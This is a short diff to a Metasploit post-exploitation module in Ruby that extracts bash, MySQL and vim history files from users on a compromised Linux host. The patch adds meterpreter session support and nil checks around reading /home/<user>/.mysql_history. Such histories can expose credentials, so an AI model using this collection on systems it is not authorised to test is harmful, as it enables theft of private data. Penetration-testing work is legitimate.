@@ -26,8 +26,8 @@ class Metasploit3 < Msf::Post
             # based largely on get_bash_history function by Stephen Haywood
             'ohdae <bindshell[at]live.com>'
           ],
-        'Platform'      => [ 'linux' ],
-        'SessionTypes'  => [ 'shell' ]
+        'Platform'      => ['linux'],
+        'SessionTypes'  => ['shell', 'meterpreter']
       ))
 
   end
@@ -123,14 +123,14 @@ class Metasploit3 < Msf::Post
     else
       vprint_status("Extracting SQL history for #{user}")
       sql_hist = cat_file("/home/#{user}/.mysql_history")
-      vprint_status(sql_hist)
-      save("SQL History for #{user}", sql_hist) unless sql_hist =~ /No such file or directory/
+      vprint_status(sql_hist) if sql_hist
+      save("SQL History for #{user}", sql_hist) unless sql_hist && sql_hist =~ /No such file or directory/
     end
   end
 
   def get_vim_history(users, user)
     if user == "root" and users != nil
-      users = users.chomp.split()
+      users = users.chomp.split
       users.each do |u|
         if u == "root"
           vprint_status("Extracting VIM history for #{u}")
